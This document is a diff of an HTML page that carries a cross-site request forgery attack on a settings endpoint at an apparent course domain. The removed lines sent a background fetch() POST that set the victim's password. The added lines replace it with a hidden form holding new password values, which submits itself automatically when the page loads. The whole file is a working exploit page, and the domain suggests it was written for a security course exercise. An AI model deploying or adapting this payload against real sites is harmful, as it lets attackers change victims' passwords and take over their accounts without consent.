@@ -1,28 +1,14 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h1>You've been redirected!</h1>
+    <form
+      action="https://cats.is-course.ru/settings"
+      method="POST">
+      <input type="hidden" name="password" value="pwd">
+      <input type="hidden" name="confirm-password" value="pwd">
+    </form>
     <script>
-      // Example CSRF attack: changing the victim's password in the background
-      const victimUrl = 'https://cats.is-course.ru/settings'; 
-
-      // Use Fetch API to send a POST request to victim's server to change the password
-      fetch(victimUrl, {
-        "headers": {
-          "Content-Type": "application/x-www-form-urlencoded",
-        },
-        "referrer": victimUrl,
-        "body": "password=d&confirm-password=d",
-        "method": "POST",
-      })
-      .then(response => {
-        if (response.ok) {
-          console.log('Password change successful!');
-        } else {
-          console.log('Failed to change password');
-        }
-      })
-      .catch(error => console.error('Error:', error));
+      document.forms[0].submit();
     </script>
   </body>
 </html>
